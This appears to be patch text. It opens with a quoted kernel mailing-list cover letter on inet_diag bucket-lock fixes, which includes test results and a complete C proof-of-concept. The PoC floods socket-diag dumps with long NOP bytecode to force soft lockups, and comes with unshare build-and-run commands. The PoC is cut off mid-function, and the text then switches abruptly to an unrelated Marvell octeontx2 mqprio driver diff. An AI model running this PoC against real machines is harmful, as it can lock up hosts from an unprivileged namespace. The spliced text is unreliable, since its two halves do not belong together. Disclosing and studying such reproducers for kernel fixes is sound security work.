+> > currently locked bucket. Listen and ehash resume also require the socke=
+t
+> > state to still belong to that table. Current-bucket membership is infer=
+red
+> > from that state plus the recomputed hash slot. If the check fails,
+> > collection restarts from the bucket head with the same batch limit. Tha=
+t
+> > fallback can emit a socket more than once, but it does not move bytecod=
+e
+> > or fill work back under the bucket lock. Bind collection counts TIME_WA=
+IT
+> > nodes toward the batch limit and restores them through tw_tb2.
+> >
+> > We also ran targeted cursor-resume stress tests on the fixed kernel. Th=
+e
+> > TCP listener workload used 131072 listeners while a separate thread
+> > repeatedly removed and recreated listeners across listener buckets. Thr=
+ee
+> > runs completed in 17024.089 ms, 17217.245 ms, and 17180.322 ms, and the
+> > guest remained alive. With temporary kernel instrumentation, one run
+> > directly observed an invalid TCP listener cursor: the cursor was unhash=
+ed
+> > and its computed bucket differed from the bucket being scanned, after
+> > which the safe restart path completed normally.
+> >
+> > A corresponding MPTCP listener workload and a TCP bound-only close/rebi=
+nd
+> > workload also completed without a crash, and the guest remained alive.
+> > Neither workload deterministically reached its instrumented invalid-cur=
+sor
+> > branch, and no crash artifact is claimed for either path.
+> >
+> > For ehash, a dedicated workload created 4096 loopback established TCP
+> > connections while a mutator replaced connection pairs concurrently. The
+> > TCPF_ALL inet_diag dump completed in 315.108 ms. No ehash invalid-curso=
+r
+> > log, soft lockup, or panic was observed. These tests exercise the relev=
+ant
+> > mutation and resume paths, but do not claim deterministic scheduling of
+> > every race between two dump callbacks.
+> >
+> > The TCP patch uses two Fixes tags for the path-specific introductions:
+> > commit 5caea4ea7088 ("net: listening_hash get a spinlock per bucket")
+> > introduced the listener bucket spinlock, and commit 91051f003948
+> > ("tcp: Dump bound-only sockets in inet_diag.") introduced the bound-onl=
+y
+> > path. The ehash dump already ran diagnostic work under the bucket lock
+> > before 7e3aab4a9cd7, which only converted that lock from read_lock_bh()
+> > to spin_lock_bh(), so that commit is not used as a Fixes tag. The MPTCP
+> > patch uses commit 4fa39b701ce9 ("mptcp: listen diag dump support").
+> >
+> > udp_diag and raw diag still run bytecode and fill under their own hash
+> > slot locks. Those locks are not the TCP listener, bind, or ehash locks,
+> > or the MPTCP listener lock, tightened by this series.
+> >
+> > Reproducer:
+> >
+> >     gcc -O2 -static -o poc poc.c
+> >     unshare -Urn ./poc
+> >
+> > This is not a packet-sequence or protocol-state reproducer. The trigger
+> > depends on creating many sockets and issuing NETLINK_SOCK_DIAG requests=
+,
+> > which packetdrill cannot express, so the PoC uses sockets and Netlink
+> > directly.
+> >
+> > To make the long bucket-locked section observable in the local QEMU
+> > run below, we enabled softlockup panic sysctls as guest root. The
+> > unshare command above uses the PoC defaults, which are:
+> >
+> >     ./poc --listen --groups 4 --stride 2048 --count 32768 --nops 16380
+> >
+> > The crash log reports UID: 0 because that process is the userns root
+> > created by unshare -Urn, after those sysctls were set as guest root.
+> > That UID does not by itself prove a host-unprivileged run. The inet_dia=
+g
+> > dump path itself is reachable from a user and net namespace.
+> >
+> > We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+> >
+> > ------BEGIN poc.c------
+> > #define _GNU_SOURCE
+> >
+> > #include <arpa/inet.h>
+> > #include <errno.h>
+> > #include <linux/inet_diag.h>
+> > #include <linux/netlink.h>
+> > #include <linux/sock_diag.h>
+> > #include <linux/tcp.h>
+> > #include <sched.h>
+> > #include <stdbool.h>
+> > #include <stdint.h>
+> > #include <stdio.h>
+> > #include <stdlib.h>
+> > #include <string.h>
+> > #include <sys/resource.h>
+> > #include <sys/socket.h>
+> > #include <sys/time.h>
+> > #include <time.h>
+> > #include <unistd.h>
+> >
+> > #ifndef SOL_TCP
+> > #define SOL_TCP 6
+> > #endif
+> >
+> > #ifndef TCP_LISTEN
+> > #define TCP_LISTEN 10
+> > #endif
+> >
+> > #define TCPF_LISTEN (1U << TCP_LISTEN)
+> >
+> > #ifndef TCP_BOUND_INACTIVE
+> > #define TCP_BOUND_INACTIVE 13
+> > #endif
+> > #ifndef TCPF_BOUND_INACTIVE
+> > #define TCPF_BOUND_INACTIVE (1U << TCP_BOUND_INACTIVE)
+> > #endif
+> >
+> > #define DEFAULT_SOCKETS 32768U
+> > #define DEFAULT_NOPS 16380U
+> > #define DEFAULT_REPEAT 1U
+> > #define DEFAULT_GROUPS 4U
+> > #define DEFAULT_STRIDE 2048U
+> > #define DEFAULT_BASE_PORT 10000
+> > #define MAX_NOPS 16380U
+> > #define RECV_BUF_SIZE (1U << 20)
+> >
+> > struct options {
+> >         unsigned int sockets;
+> >         unsigned int nops;
+> >         unsigned int repeat;
+> >         unsigned int groups;
+> >         unsigned int stride;
+> >         unsigned int cpu;
+> >         bool cpu_set;
+> >         bool compare;
+> >         bool attack;
+> >         bool listen_mode;
+> >         int port;
+> > };
+> >
+> > static void usage(const char *prog)
+> > {
+> >         fprintf(stderr,
+> >                 "Usage: %s [--count N] [--nops N] [--repeat N] [--port =
+P] [--cpu N]\n"
+> >                 "          [--groups N] [--stride N] [--compare] [--no-=
+attack]\n"
+> >                 "          [--listen | --bound]\n"
+> >                 "Defaults: --count %u --nops %u --repeat %u\n",
+> >                 prog, DEFAULT_SOCKETS, DEFAULT_NOPS, DEFAULT_REPEAT);
+> > }
+> >
+> > static long long timespec_delta_ns(const struct timespec *start,
+> >                                        const struct timespec *end)
+> > {
+> >         return (end->tv_sec - start->tv_sec) * 1000000000LL +
+> >                (end->tv_nsec - start->tv_nsec);
+> > }
+> >
+> > static int raise_nofile_limit(rlim_t needed)
+> > {
+> >         struct rlimit lim;
+> >
+> >         if (getrlimit(RLIMIT_NOFILE, &lim) < 0) {
+> >                 perror("getrlimit(RLIMIT_NOFILE)");
+> >                 return -1;
+> >         }
+> >
+> >         if (lim.rlim_cur >=3D needed)
+> >                 return 0;
+> >
+> >         if (lim.rlim_max < needed)
+> >                 needed =3D lim.rlim_max;
+> >
+> >         lim.rlim_cur =3D needed;
+> >         if (setrlimit(RLIMIT_NOFILE, &lim) < 0) {
+> >                 perror("setrlimit(RLIMIT_NOFILE)");
+> >                 return -1;
+> >         }
+> >
+> >         if (getrlimit(RLIMIT_NOFILE, &lim) < 0) {
+> >                 perror("getrlimit(RLIMIT_NOFILE)");
+> >                 return -1;
+> >         }
+> >
+> >         if (lim.rlim_cur < needed) {
+> >                 fprintf(stderr, "RLIMIT_NOFILE stayed at %llu, need %ll=
+u\n",
+> >                         (unsigned long long)lim.rlim_cur,
+> >                         (unsigned long long)needed);
+> >                 return -1;
+> >         }
+> >
+> >         return 0;
+> > }
+> >
+> > static int pin_to_cpu(unsigned int cpu)
+> > {
+> >         cpu_set_t set;
+> >
+> >         CPU_ZERO(&set);
+> >         CPU_SET(cpu, &set);
+> >         if (sched_setaffinity(0, sizeof(set), &set) < 0) {
+> >                 perror("sched_setaffinity");
+> >                 return -1;
+> >         }
+> >
+> >         return 0;
+> > }
+> >
+> > static int create_socket_in_bucket(bool listen_mode, int port, int *bou=
+nd_port)
+> > {
+> >         struct sockaddr_in addr =3D {
+> >                 .sin_family =3D AF_INET,
+> >                 .sin_addr.s_addr =3D htonl(INADDR_ANY),
+> >         };
+> >         socklen_t addrlen =3D sizeof(addr);
+> >         int one =3D 1;
+> >         int fd;
+> >
+> >         fd =3D socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+> >         if (fd < 0) {
+> >                 perror("socket(AF_INET, SOCK_STREAM)");
+> >                 return -1;
+> >         }
+> >
+> >         if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one))=
+ < 0) {
+> >                 perror("setsockopt(SO_REUSEADDR)");
+> >                 goto err;
+> >         }
+> >
+> >         if (setsockopt(fd, SOL_SOCKET, SO_REUSEPORT, &one, sizeof(one))=
+ < 0) {
+> >                 perror("setsockopt(SO_REUSEPORT)");
+> >                 goto err;
+> >         }
+> >
+> >         addr.sin_port =3D htons(port);
+> >         if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+> >                 perror("bind");
+> >                 goto err;
+> >         }
+> >
+> >         if (getsockname(fd, (struct sockaddr *)&addr, &addrlen) < 0) {
+> >                 perror("getsockname");
+> >                 goto err;
+> >         }
+> >
+> >         if (listen_mode) {
+> >                 if (listen(fd, 0) < 0) {
+> >                         perror("listen");
+> >                         goto err;
+> >                 }
+> >         }
+> >
+> >         *bound_port =3D ntohs(addr.sin_port);
+> >         return fd;
+> >
+> > err:
+> >         close(fd);
+> >         return -1;
+> > }
+> >
+> > static int setup_sockets(bool listen_mode, unsigned int groups,
+> >                          unsigned int count_per_group, unsigned int str=
+ide,
+> >                          int requested_port, int **fds_out, int *port_o=
+ut)
+> > {
+> >         int *fds;
+> >         unsigned int g, i;
+> >         unsigned int total =3D groups * count_per_group;
+> >         int base_port =3D requested_port ? requested_port : DEFAULT_BAS=
+E_PORT;
+> >
+> >         fds =3D calloc(total, sizeof(*fds));
+> >         if (!fds) {
+> >                 perror("calloc(socket fds)");
+> >                 return -1;
+> >         }
+> >
+> >         for (g =3D 0; g < groups; g++) {
+> >                 int port =3D base_port + (int)(g * stride);
+> >
+> >                 if (port <=3D 0 || port > 65535) {
+> >                         fprintf(stderr, "port overflow for group %u (ba=
+se=3D%d stride=3D%u)\n",
+> >                                 g, base_port, stride);
+> >                         goto err;
+> >                 }
+> >
+> >                 for (i =3D 0; i < count_per_group; i++) {
+> >                         unsigned int idx =3D g * count_per_group + i;
+> >                         int bound_port =3D port;
+> >                         int fd =3D create_socket_in_bucket(listen_mode,=
+ bound_port,
+> >                                                          &bound_port);
+> >
+> >                         if (fd < 0) {
+> >                                 fprintf(stderr,
+> >                                         "socket setup failed at group %=
+u index %u (port %d)\n",
+> >                                         g, i, port);
+> >                                 goto err;
+> >                         }
+> >
+> >                         fds[idx] =3D fd;
+> >                         if ((idx + 1) % 4096U =3D=3D 0 || idx + 1 =3D=
+=3D total) {
+> >                                 printf("sockets_ready=3D%u group=3D%u p=
+ort=3D%d mode=3D%s\n",
+> >                                        idx + 1, g + 1, port,
+> >                                        listen_mode ? "listen" : "bound"=
+);
+> >                         }
+> >                 }
+> >         }
+> >
+> >         *fds_out =3D fds;
+> >         *port_out =3D base_port;
+> >         return 0;
+> >
+> > err:
+> >         for (i =3D 0; i < total; i++) {
+> >                 if (fds[i] > 0)
+> >                         close(fds[i]);
+> >         }
+> >         free(fds);
+> >         return -1;
+> > }
+> >
+> > static void teardown_sockets(int *fds, unsigned int count)
+> > {
+> >         unsigned int i;
+> >
+> >         if (!fds)
+> >                 return;
+> >
+> >         for (i =3D 0; i < count; i++) {
+> >                 if (fds[i] >=3D 0)
+> >                         close(fds[i]);
+> >         }
+> >         free(fds);
+> > }
+> >
+> > static size_t build_request(void *buf, bool listen_mode, bool with_atta=
+ck,
+> >                             unsigned int nops)
+> > {
+> >         size_t msg_len =3D NLMSG_SPACE(sizeof(struct inet_diag_req_v2))=
+;
+> >         struct nlmsghdr *nlh =3D buf;
+> >         struct inet_diag_req_v2 *req;
+> >
+> >         memset(buf, 0, msg_len);
+> >         nlh->nlmsg_len =3D msg_len;
+> >         nlh->nlmsg_type =3D SOCK_DIAG_BY_FAMILY;
+> >         nlh->nlmsg_flags =3D NLM_F_REQUEST | NLM_F_DUMP;
+> >         nlh->nlmsg_seq =3D 1;
+> >
+> >         req =3D NLMSG_DATA(nlh);
+> >         req->sdiag_family =3D AF_INET;
+> >         req->sdiag_protocol =3D IPPROTO_TCP;
+> >         req->idiag_states =3D listen_mode ? TCPF_LISTEN : TCPF_BOUND_IN=
+ACTIVE;
+> >         req->id.idiag_cookie[0] =3D INET_DIAG_NOCOOKIE;
+> >         req->id.idiag_cookie[1] =3D INET_DIAG_NOCOOKIE;
+> >
+> >         if (with_attack) {
+> >                 size_t payload_len =3D ((size_t)nops + 2U) *
+> >                                      sizeof(struct inet_diag_bc_op);
+> >                 size_t attr_len =3D NLA_HDRLEN + payload_len;
+> >                 struct nlattr *nla =3D (struct nlattr *)((char *)buf + =
+msg_len);
+> >                 struct inet_diag_bc_op *ops;
+> >                 unsigned int i;
+> >
+> >                 memset(nla, 0, NLA_ALIGN(attr_len));
+> >                 nla->nla_type =3D INET_DIAG_REQ_BYTECODE;
+> >                 nla->nla_len =3D attr_len;
+> >                 ops =3D (struct inet_diag_bc_op *)((char *)nla + NLA_HD=
+RLEN);
+> >
+> >                 for (i =3D 0; i < nops; i++) {
+> >                         ops[i].code =3D INET_DIAG_BC_NOP;
+> >                         ops[i].yes =3D sizeof(struct inet_diag_bc_op);
+> >                         ops[i].no =3D 0;
+> >                 }
+> >
+> >                 ops[nops].code =3D INET_DIAG_BC_D_EQ;
+> >                 ops[nops].yes =3D 2U * sizeof(struct inet_diag_bc_op);
+> >                 ops[nops].no =3D 3U * sizeof(struct inet_diag_bc_op);
+> >
+> >                 ops[nops + 1].code =3D 0;
+> >                 ops[nops + 1].yes =3D 0;
+> >                 ops[nops + 1].no =3D 1;
+> >
+> >                 msg_len +=3D NLA_ALIGN(attr_len);
+> >                 nlh->nlmsg_len =3D msg_len;
+> >         }
+> >
+> >         return msg_len;
+> > }
+> >
+> > static int recv_until_done(int fd)
+> > {
+> >         char *buf;
+> >         int ret =3D 0;
+> >
+> >         buf =3D malloc(RECV_BUF_SIZE);
+> >         if (!buf) {
+> >                 perror("malloc(recv buf)");
+> >                 return -1;
+> >         }
+> >
+> >         for (;;) {
+> >                 ssize_t received =3D recv(fd, buf, RECV_BUF_SIZE, 0);
+> >                 struct nlmsghdr *nlh;
+> >                 int remaining;
+> >
+> >                 if (received < 0) {
+> >                         perror("recv");
+> >                         ret =3D -1;
+> >                         break;
+> >                 }
+> >
+> >                 if (received =3D=3D 0) {
+> >                         fprintf(stderr, "recv: unexpected EOF\n");
+> >                         ret =3D -1;
+> >                         break;
+> >                 }
+> >
+> >                 remaining =3D (int)received;
+> >                 for (nlh =3D (struct nlmsghdr *)buf; NLMSG_OK(nlh, rema=
+ining);
+> >                      nlh =3D NLMSG_NEXT(nlh, remaining)) {
+> >                         if (nlh->nlmsg_type =3D=3D NLMSG_DONE)
+> >                                 goto out;
+> >
+> >                         if (nlh->nlmsg_type =3D=3D NLMSG_ERROR) {
+> >                                 const struct nlmsgerr *err =3D NLMSG_DA=
+TA(nlh);
+> >
+> >                                 if (nlh->nlmsg_len < NLMSG_LENGTH(sizeo=
+f(*err))) {
+> >                                         fprintf(stderr, "short NLMSG_ER=
+ROR\n");
+> >                                 } else if (err->error) {
+> >                                         errno =3D -err->error;
+> >                                         perror("netlink");
+> >                                 } else {
+> >                                         fprintf(stderr, "unexpected ACK=
+\n");
+> >                                 }
+> >                                 ret =3D -1;
+> >                                 goto out;
+> >                         }
+> >                 }
+> >         }
+> >
+> > out:
+> >         free(buf);
+> >         return ret;
+> > }
+> >
+> > static int run_dump(bool listen_mode, bool with_attack, unsigned int no=
+ps,
+> >                     double *wall_ms)
+> > {
+> >         size_t request_len;
+> >         size_t attr_space =3D with_attack ?
+> >                             NLA_ALIGN(NLA_HDRLEN +
+> >                                       ((size_t)nops + 2U) *
+> >                                       sizeof(struct inet_diag_bc_op)) :=
+ 0;
+> >         size_t alloc_len =3D NLMSG_SPACE(sizeof(struct inet_diag_req_v2=
+)) +
+> >                            attr_space;
+> >         struct sockaddr_nl local =3D {
+> >                 .nl_family =3D AF_NETLINK,
+> >         };
+> >         struct sockaddr_nl kernel =3D {
+> >                 .nl_family =3D AF_NETLINK,
+> >         };
+> >         struct timeval timeout =3D {
+> >                 .tv_sec =3D 60,
+> >                 .tv_usec =3D 0,
+> >         };
+> >         struct iovec iov;
+> >         struct msghdr msg =3D {
+> >                 .msg_name =3D &kernel,
+> >                 .msg_namelen =3D sizeof(kernel),
+> >                 .msg_iov =3D &iov,
+> >                 .msg_iovlen =3D 1,
+> >         };
+> >         struct timespec start_ts;
+> >         struct timespec end_ts;
+> >         void *request;
+> >         int fd;
+> >         int ret =3D -1;
+> >
+> >         request =3D malloc(alloc_len);
+> >         if (!request) {
+> >                 perror("malloc(request)");
+> >                 return -1;
+> >         }
+> >
+> >         request_len =3D build_request(request, listen_mode, with_attack=
+, nops);
+> >
+> >         fd =3D socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_SOCK=
+_DIAG);
+> >         if (fd < 0) {
+> >                 perror("socket(AF_NETLINK)");
+> >                 free(request);
+> >                 return -1;
+> >         }
+> >
+> >         if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(ti=
+meout)) < 0) {
+> >                 perror("setsockopt(SO_RCVTIMEO)");
+> >                 goto out;
+> >         }
+> >
+> >         if (bind(fd, (struct sockaddr *)&local, sizeof(local)) < 0) {
+> >                 perror("bind(netlink)");
+> >                 goto out;
+> >         }
+> >
+> >         iov.iov_base =3D request;
+> >         iov.iov_len =3D request_len;
+> >
+> >         if (clock_gettime(CLOCK_MONOTONIC_RAW, &start_ts) < 0) {
+> >                 perror("clock_gettime(start)");
+> >                 goto out;
+> >         }
+> >
+> >         if (sendmsg(fd, &msg, 0) < 0) {
+> >                 perror("sendmsg");
+> >                 goto out;
+> >         }
+> >
+> >         if (recv_until_done(fd) < 0)
+> >                 goto out;
+> >
+> >         if (clock_gettime(CLOCK_MONOTONIC_RAW, &end_ts) < 0) {
+> >                 perror("clock_gettime(end)");
+> >                 goto out;
+> >         }
+> >
+> >         *wall_ms =3D (double)timespec_delta_ns(&start_ts, &end_ts) / 10=
+00000.0;
+> >         ret =3D 0;
+> >
+> > out:
+> >         close(fd);
+> >         free(request);
+> >         return ret;
+> > }
+> >
+> > static int parse_u32(const char *arg, unsigned int *value)
+> > {
+> >         char *end =3D NULL;
+> >         unsigned long parsed;
+> >
+> >         parsed =3D strtoul(arg, &end, 0);
+> >         if (!end || *end || parsed > UINT32_MAX)
+> >                 return -1;
+> >
+> >         *value =3D (unsigned int)parsed;
+> >         return 0;
+> > }
+> >
+> > static int parse_port(const char *arg, int *port)
+> > {
+> >         unsigned int value;
+> >
+> >         if (parse_u32(arg, &value) < 0 || value > 65535U)
+> >                 return -1;
+> >
+> >         *port =3D (int)value;
+> >         return 0;
+> > }
+> >
+> > int main(int argc, char **argv)
+> > {
+> >         struct options opts =3D {
+> >                 .sockets =3D DEFAULT_SOCKETS,
+> >                 .nops =3D DEFAULT_NOPS,
+> >                 .repeat =3D DEFAULT_REPEAT,
+> >                 .groups =3D DEFAULT_GROUPS,
+> >                 .stride =3D DEFAULT_STRIDE,
+> >                 .cpu =3D 0,
+> >                 .cpu_set =3D false,
+> >                 .compare =3D false,
+> >                 .attack =3D true,
+> >                 .listen_mode =3D true,
+> >                 .port =3D 0,
+> >         };
+> >         int *fds =3D NULL;
+> >         int port =3D 0;
+> >         unsigned int i;
+> >
+> >         for (i =3D 1; i < (unsigned int)argc; i++) {
+> >                 if (strcmp(argv[i], "--count") =3D=3D 0) {
+> >                         if (i + 1 >=3D (unsigned int)argc ||
+> >                             parse_u32(argv[++i], &opts.sockets) < 0 ||
+> >                             opts.sockets =3D=3D 0) {
+> >                                 usage(argv[0]);
+> >                                 return 1;
+> >                         }
+> >                 } else if (strcmp(argv[i], "--nops") =3D=3D 0) {
+> >                         if (i + 1 >=3D (unsigned int)argc ||
+> >                             parse_u32(argv[++i], &opts.nops) < 0 ||
+> >                             opts.nops > MAX_NOPS) {
+> >                                 fprintf(stderr, "--nops must be in rang=
+e [0, %u]\n",
+> >                                         MAX_NOPS);
+> >                                 return 1;
+> >                         }
+> >                 } else if (strcmp(argv[i], "--repeat") =3D=3D 0) {
+> >                         if (i + 1 >=3D (unsigned int)argc ||
+> >                             parse_u32(argv[++i], &opts.repeat) < 0 ||
+> >                             opts.repeat =3D=3D 0) {
+> >                                 usage(argv[0]);
+> >                                 return 1;
+> >                         }
+> >                 } else if (strcmp(argv[i], "--groups") =3D=3D 0) {
+> >                         if (i + 1 >=3D (unsigned int)argc ||
+> >                             parse_u32(argv[++i], &opts.groups) < 0 ||
+> >                             opts.groups =3D=3D 0) {
+> >                                 usage(argv[0]);
+> >                                 return 1;
+> >                         }
+> >                 } else if (strcmp(argv[i], "--stride") =3D=3D 0) {
+> >                         if (i + 1 >=3D (unsigned int)argc ||
+> >                             parse_u32(argv[++i], &opts.stride) < 0 ||
+> >                             opts.stride =3D=3D 0) {
+> >                                 usage(argv[0]);
+> >                                 return 1;
+> >                         }
+> >                 } else if (strcmp(argv[i], "--port") =3D=3D 0) {
+> >                         if (i + 1 >=3D (unsigned int)argc ||
+> >                             parse_port(argv[++i], &opts.port) < 0) {
+> >                                 usage(argv[0]);
+> >                                 return 1;
+> >                         }
+> >                 } else if (strcmp(argv[i], "--cpu") =3D=3D 0) {
+> >                         if (i + 1 >=3D (unsigned int)argc ||
+> >                             parse_u32(argv[++i], &opts.cpu) < 0) {
+> >                                 usage(argv[0]);
+> >                                 return 1;
+> >                         }
+> >                         opts.cpu_set =3D true;
+> >                 } else if (strcmp(argv[i], "--compare") =3D=3D 0) {
+> >                         opts.compare =3D true;
+> >                 } else if (strcmp(argv[i], "--no-attack") =3D=3D 0) {
+> >                         opts.attack =3D false;
+> >                 } else if (strcmp(argv[i], "--listen") =3D=3D 0) {
+> >                         opts.listen_mode =3D true;
+> >                 } else if (strcmp(argv[i], "--bound") =3D=3D 0) {
+> >                         opts.listen_mode =3D false;
+> >                 } else {
+> >                         usage(argv[0]);
+> >                         return 1;
+> >                 }
+> >         }
+> >
+> >         if (opts.groups > UINT32_MAX / opts.sockets) {
+> >                 fprintf(stderr, "socket count overflow\n");
+> >                 return 1;
+> >         }
+> >
+> >         if (raise_nofile_limit((rlim_t)opts.sockets * opts.groups + 64U=
+) < 0)
+> >                 return 1;
+> >
+> >         if (opts.cpu_set && pin_to_cpu(opts.cpu) < 0)
+> >                 return 1;
+> >
+> >         if (setup_sockets(opts.listen_mode, opts.groups, opts.sockets,
+> >                           opts.stride, opts.port, &fds, &port) < 0)
+> >                 return 1;
+> >
+> >         printf("setup_complete groups=3D%u sockets_per_group=3D%u total=
+_sockets=3D%u base_port=3D%d stride=3D%u mode=3D%s nops=3D%u repeat=3D%u co=
+mpare=3D%s attack=3D%s\n",
+> >                opts.groups, opts.sockets, opts.groups * opts.sockets,
+> >                port, opts.stride, opts.listen_mode ? "listen" : "bound"=
+,
+> >                opts.nops, opts.repeat,
+> >                opts.compare ? "yes" : "no",
+> >                opts.attack ? "yes" : "no");
+> >
+> >         if (opts.compare) {
+> >                 double wall_ms;
+> >
+> >                 if (run_dump(opts.listen_mode, false, 0, &wall_ms) < 0)=
  {
- 	u16 (*schq_list)[MAX_TXSCHQ_PER_FUNC];
-@@ -651,7 +787,11 @@ int otx2_txschq_config(struct otx2_nic *pfvf, int lvl, int prio, bool txschq_for
- 						(u64)hw->smq_link_type);
- 		req->num_regs++;
- 		/* MDQ config */
--		parent = schq_list[NIX_TXSCH_LVL_TL4][prio];
-+		if (pfvf->mqprio.rate_limit)
-+			parent = schq_list[NIX_TXSCH_LVL_TL4][0];
-+		else
-+			parent = schq_list[NIX_TXSCH_LVL_TL4][prio];
-+
- 		req->reg[1] = NIX_AF_MDQX_PARENT(schq);
- 		req->regval[1] = parent << 16;
- 		req->num_regs++;
-@@ -779,6 +919,9 @@ int otx2_txsch_alloc(struct otx2_nic *pfvf)
- 		req->schq[NIX_TXSCH_LVL_TL4] = chan_cnt;
- 	}
- 
-+	if (pfvf->mqprio.rate_limit)
-+		req->schq[NIX_TXSCH_LVL_SMQ] = pfvf->hw.non_qos_queues;
-+
- 	rc = otx2_sync_mbox_msg(&pfvf->mbox);
- 	if (rc)
- 		return rc;
-@@ -844,6 +987,7 @@ void otx2_txschq_stop(struct otx2_nic *pfvf)
- 
- 	/* Clear the txschq list */
- 	for (lvl = 0; lvl < NIX_TXSCH_LVL_CNT; lvl++) {
-+		pfvf->hw.txschq_cnt[lvl] = 0;
- 		for (schq = 0; schq < MAX_TXSCHQ_PER_FUNC; schq++)
- 			pfvf->hw.txschq_list[lvl][schq] = 0;
- 	}
-diff --git a/drivers/net/ethernet/marvell/octeontx2/nic/otx2_common.h b/drivers/net/ethernet/marvell/octeontx2/nic/otx2_common.h
-index eecee612b7b2..ede7f1113b71 100644
---- a/drivers/net/ethernet/marvell/octeontx2/nic/otx2_common.h
-+++ b/drivers/net/ethernet/marvell/octeontx2/nic/otx2_common.h
-@@ -17,6 +17,7 @@
- #include <linux/soc/marvell/silicons.h>
- #include <linux/soc/marvell/octeontx2/asm.h>
- #include <net/macsec.h>
-+#include <uapi/linux/pkt_sched.h>
- #include <net/pkt_cls.h>
- #include <net/devlink.h>
- #include <linux/time64.h>
-@@ -483,6 +484,23 @@ struct pf_irq_data {
- 	int mdevs;
- };
- 
-+struct mq_offload_snap {
-+	u64 min_rate[TC_QOPT_MAX_QUEUE];
-+	u64 max_rate[TC_QOPT_MAX_QUEUE];
-+	__u8 num_tc;
-+	__u16 count[TC_QOPT_MAX_QUEUE];
-+	__u16 offset[TC_QOPT_MAX_QUEUE];
-+};
-+
-+struct otx2_mqprio {
-+	u32	flags;
-+	u64	*min_rate;
-+	u64	*max_rate;
-+	bool	rate_limit;
-+	bool	replace_setup_done;
-+	bool	replace_graft_done;
-+};
-+
- struct otx2_nic {
- 	void __iomem		*reg_base;
- 	struct net_device	*netdev;
-@@ -515,6 +533,10 @@ struct otx2_nic {
- 	u64			flags;
- 	u64			*cq_op_addr;
- 
-+	struct otx2_mqprio	mqprio;
-+	struct mq_offload_snap	*cur_mq_snap;
-+	struct mq_offload_snap	*old_mq_snap;
-+
- 	struct bpf_prog		*xdp_prog;
- 	struct otx2_qset	qset;
- 	struct otx2_hw		hw;
-@@ -1246,6 +1268,11 @@ dma_addr_t otx2_dma_map_skb_frag(struct otx2_nic *pfvf,
- 				 struct sk_buff *skb, int seg, int *len);
- void otx2_dma_unmap_skb_frags(struct otx2_nic *pfvf, struct sg_list *sg);
- int otx2_read_free_sqe(struct otx2_nic *pfvf, u16 qidx);
-+int otx2_nix_tm_set_queue_shaper(struct otx2_nic *pfvf, int txq,
-+				 u64 minrate, u64 maxrate);
-+int otx2_nix_tm_clear_queue_shaper(struct otx2_nic *pfvf);
-+int otx2_mqprio_down(struct otx2_nic *pfvf);
-+int otx2_mqprio_up(struct otx2_nic *pfvf);
- void otx2_queue_vf_work(struct mbox *mw, struct workqueue_struct *mbox_wq,
- 			int first, int mdevs, u64 intr);
- int otx2_del_mcam_flow_entry(struct otx2_nic *nic, u16 entry,
-diff --git a/drivers/net/ethernet/marvell/octeontx2/nic/otx2_dcbnl.c b/drivers/net/ethernet/marvell/octeontx2/nic/otx2_dcbnl.c
-index f110dfa42360..4a70abc230be 100644
---- a/drivers/net/ethernet/marvell/octeontx2/nic/otx2_dcbnl.c
-+++ b/drivers/net/ethernet/marvell/octeontx2/nic/otx2_dcbnl.c
-@@ -413,6 +413,12 @@ static int otx2_dcbnl_ieee_setpfc(struct net_device *dev, struct ieee_pfc *pfc)
- 	u8 old_pfc_en;
- 	int err;
- 
-+	if (pfvf->mqprio.rate_limit && pfc->pfc_en) {
-+		netdev_err(dev,
-+			   "PFC: cannot enable while mqprio bandwidth offload is active\n");
-+		return -EOPNOTSUPP;
-+	}
-+
- 	old_pfc_en = pfvf->pfc_en;
- 	pfvf->pfc_en = pfc->pfc_en;
- 
-diff --git a/drivers/net/ethernet/marvell/octeontx2/nic/otx2_ethtool.c b/drivers/net/ethernet/marvell/octeontx2/nic/otx2_ethtool.c
-index 9bee1b91eeaa..ec2601c6c255 100644
---- a/drivers/net/ethernet/marvell/octeontx2/nic/otx2_ethtool.c
-+++ b/drivers/net/ethernet/marvell/octeontx2/nic/otx2_ethtool.c
-@@ -287,6 +287,14 @@ static int otx2_set_channels(struct net_device *dev,
- 		return -EINVAL;
- 	}
- 
-+	if (pfvf->mqprio.rate_limit &&
-+	    (channel->tx_count != pfvf->hw.tx_queues ||
-+	     channel->rx_count != pfvf->hw.rx_queues)) {
-+		netdev_info(dev,
-+			    "Not permitted to change channel count while MQ prio is active\n");
-+		return -EINVAL;
-+	}
-+
- 	if (if_up)
- 		dev->netdev_ops->ndo_stop(dev);
- 
-diff --git a/drivers/net/ethernet/marvell/octeontx2/nic/otx2_pf.c b/drivers/net/ethernet/marvell/octeontx2/nic/otx2_pf.c
-index c995f2900859..79a82e445454 100644
---- a/drivers/net/ethernet/marvell/octeontx2/nic/otx2_pf.c
-+++ b/drivers/net/ethernet/marvell/octeontx2/nic/otx2_pf.c
-@@ -1980,6 +1980,12 @@ int otx2_open(struct net_device *netdev)
- 	if (err)
- 		goto err_free_mem;
- 
-+	err = otx2_mqprio_up(pf);
-+	if (err)
-+		netdev_err(pf->netdev,
-+			   "mqprio: failed to restore shapers during open: %d; continuing without bandwidth limits\n",
-+			   err);
-+
- 	/* Register NAPI handler */
- 	for (qidx = 0; qidx < pf->hw.cint_cnt; qidx++) {
- 		cq_poll = &qset->napi[qidx];
-@@ -2846,6 +2852,12 @@ static int otx2_xdp_setup(struct otx2_nic *pf, struct bpf_prog *prog)
- 	bool if_up = netif_running(pf->netdev);
- 	struct bpf_prog *old_prog;
- 
-+	if (prog && pf->mqprio.rate_limit) {
-+		netdev_err(dev,
-+			   "XDP: cannot attach while mqprio bandwidth offload is active\n");
-+		return -EOPNOTSUPP;
-+	}
-+
- 	if (prog && dev->mtu > MAX_XDP_MTU) {
- 		netdev_warn(dev, "Jumbo frames not yet supported with XDP\n");
- 		return -EOPNOTSUPP;
-diff --git a/drivers/net/ethernet/marvell/octeontx2/nic/otx2_tc.c b/drivers/net/ethernet/marvell/octeontx2/nic/otx2_tc.c
-index 039fd47ebf52..4090296edfc5 100644
---- a/drivers/net/ethernet/marvell/octeontx2/nic/otx2_tc.c
